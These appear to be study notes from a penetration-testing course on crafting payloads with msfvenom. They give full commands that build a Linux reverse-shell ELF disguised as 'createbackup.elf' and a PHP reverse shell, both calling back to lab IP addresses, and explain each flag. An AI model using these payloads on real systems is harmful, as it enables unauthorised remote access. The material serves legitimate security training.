```
msfvenom -l payloads
```

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
#### Call MSFvenom

  Crafting Payloads with MSFvenom

```shell-session
msfvenom
```

Defines the tool used to make the payload.

#### Creating a Payload

  Crafting Payloads with MSFvenom

```shell-session
-p 
```

This `option` indicates that msfvenom is creating a payload.

#### Choosing the Payload based on Architecture

  Crafting Payloads with MSFvenom

```shell-session
linux/x64/shell_reverse_tcp 
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

#### Address To Connect Back To

  Crafting Payloads with MSFvenom

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).

#### Format To Generate Payload In

  Crafting Payloads with MSFvenom

```shell-session
-f elf 
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output

  Crafting Payloads with MSFvenom

```shell-session
> createbackup.elf
```

```
msfvenom -p php/reverse_php LHOST=10.10.14.110 LPORT=443 > shell.php
```

No need -F